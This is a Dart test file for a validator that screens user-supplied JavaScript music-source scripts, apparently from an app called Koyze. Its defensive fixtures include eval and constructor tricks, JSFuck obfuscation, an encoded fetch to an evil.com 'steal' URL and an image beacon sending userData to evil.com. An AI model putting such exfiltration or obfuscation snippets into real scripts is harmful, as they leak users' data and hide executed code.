// Copyright 2024 Koyze Contributors
// Licensed under the Apache License, Version 2.0

import 'package:flutter_test/flutter_test.dart';
import 'package:koyze/features/custom_source/domain/enhanced_script_validator.dart';

void main() {
  group('EnhancedSourceScriptValidator', () {
    group('Dynamic Code Execution Detection', () {
      test('should reject eval() usage', () {
        final script = '''
          function malicious() {
            eval('alert("hacked")');
          }
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
        expect(
          result.criticalIssues.any(
            (i) => i.code == SecurityIssue.dynamicCodeExecution,
          ),
          true,
        );
      });

      test('should reject Function() constructor', () {
        final script = '''
          const fn = new Function('return 1 + 1');
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
        expect(result.criticalIssues.isNotEmpty, true);
      });

      test('should reject indirect eval via bracket notation', () {
        final script = '''
          window['eval']('malicious code');
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
      });

      test('should reject constructor exploitation', () {
        final script = '''
          someObject['constructor']('alert(1)')();
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.highIssues.isNotEmpty, true);
      });
    });

    group('Forbidden Global Access', () {
      test('should reject process access', () {
        final script = '''
          const env = process.env;
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
        expect(
          result.criticalIssues.any(
            (i) => i.code == SecurityIssue.forbiddenGlobalAccess,
          ),
          true,
        );
      });

      test('should reject require() calls', () {
        final script = '''
          const fs = require('fs');
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
      });

      test('should reject Buffer access', () {
        final script = '''
          const buf = Buffer.from('data');
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
      });
    });

    group('Obfuscation Detection', () {
      test('should detect excessive unicode escapes', () {
        final script = '''
          const str = "\\u0068\\u0065\\u006c\\u006c\\u006f" + 
                      "\\u0077\\u006f\\u0072\\u006c\\u0064" +
                      "\\u0074\\u0065\\u0073\\u0074\\u0069\\u006e\\u0067";
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(
          result.issues.any(
            (i) => i.code == SecurityIssue.suspiciousObfuscation,
          ),
          true,
        );
      });

      test('should detect JSFuck-style obfuscation', () {
        final script = '''
          [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]]
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
        expect(
          result.highIssues.any(
            (i) => i.code == SecurityIssue.suspiciousObfuscation,
          ),
          true,
        );
      });

      test('should detect string reversal patterns', () {
        final script = '''
          const secret = "lave".split("").reverse().join("");
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(
          result.issues.any(
            (i) => i.code == SecurityIssue.suspiciousObfuscation,
          ),
          true,
        );
      });

      test('should detect excessive bracket notation', () {
        final script = '''
          obj["prop1"]["prop2"]["prop3"]["prop4"]["prop5"]
          obj["method1"]()["method2"]()["method3"]()
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(
          result.issues.any(
            (i) => i.code == SecurityIssue.suspiciousObfuscation,
          ),
          true,
        );
      });
    });

    group('Entropy Analysis', () {
      test('should detect high entropy (encrypted code)', () {
        // Simulated base64-encoded payload
        final script = '''
          const payload = "YWxlcnQoJ3Rlc3QnKTtjb25zb2xlLmxvZygnZGF0YScpO2V2YWwoJ21hbGljaW91cycpO2RvY3VtZW50LmNvb2tpZT0nJzs=";
          const decoded = atob(payload);
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        // High entropy string should trigger warning
        expect(result.metadata.containsKey('entropy'), true);
      });

      test('should pass normal code entropy', () {
        final script = '''
          function search(query) {
            return fetch(`https://api.music.163.com/search?keywords=\${query}`)
              .then(res => res.json())
              .then(data => data.result.songs);
          }
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        final entropy = result.metadata['entropy'] as double;
        
        expect(entropy < 4.5, true);
      });
    });

    group('Suspicious Network Patterns', () {
      test('should detect base64-encoded URLs', () {
        final script = '''
          const url = atob("aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==");
          fetch(url);
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(
          result.highIssues.any(
            (i) => i.code == SecurityIssue.suspiciousNetworkPattern,
          ),
          true,
        );
      });

      test('should detect IP address literals', () {
        final script = '''
          fetch("http://192.168.1.100/api");
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(
          result.issues.any(
            (i) => i.code == SecurityIssue.suspiciousNetworkPattern,
          ),
          true,
        );
      });

      test('should detect suspicious TLDs', () {
        final script = '''
          fetch("https://malicious.tk/steal");
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(
          result.issues.any(
            (i) => i.code == SecurityIssue.suspiciousNetworkPattern,
          ),
          true,
        );
      });

      test('should detect image beacon (data exfiltration)', () {
        final script = '''
          const img = new Image();
          img.src = "https://evil.com/track?data=" + userData;
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(
          result.highIssues.any(
            (i) => i.code == SecurityIssue.suspiciousNetworkPattern,
          ),
          true,
        );
      });
    });

    group('Size and Complexity Limits', () {
      test('should reject oversized scripts', () {
        final script = 'x' * (2 * 1024 * 1024 + 1); // 2MB + 1
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, false);
        expect(
          result.criticalIssues.any(
            (i) => i.code == SecurityIssue.excessiveComplexity,
          ),
          true,
        );
      });

      test('should reject excessive nesting depth', () {
        final script = '{{{{{{{{{{{{{{{{{{{{{{' + 
                       '}}}}}}}}}}}}}}}}}}}}}}'; // Deep nesting
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.metadata['maxNestingDepth'], greaterThan(20));
      });
    });

    group('Legitimate Scripts', () {
      test('should pass clean music source script', () {
        final script = '''
          function search(query) {
            return fetch("https://music.163.com/api/search", {
              method: "POST",
              body: JSON.stringify({ s: query, type: 1 })
            }).then(res => res.json());
          }
          
          function getPlayUrl(songId) {
            return fetch("https://music.163.com/api/song/detail?ids=[" + songId + "]")
              .then(res => res.json())
              .then(data => data.songs[0].url);
          }
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.isSecure, true);
        expect(result.criticalIssues, isEmpty);
      });

      test('should track metadata for clean scripts', () {
        final script = '''
          function fetchData() {
            return fetch("https://api.qq.com/data");
          }
        ''';
        
        final result = EnhancedSourceScriptValidator.validate(script);
        
        expect(result.metadata['size'], greaterThan(0));
        expect(result.metadata['lines'], greaterThan(0));
        expect(result.metadata['entropy'], greaterThan(0));
        expect(result.metadata.containsKey('maxNestingDepth'), true);
      });
    });
  });
}
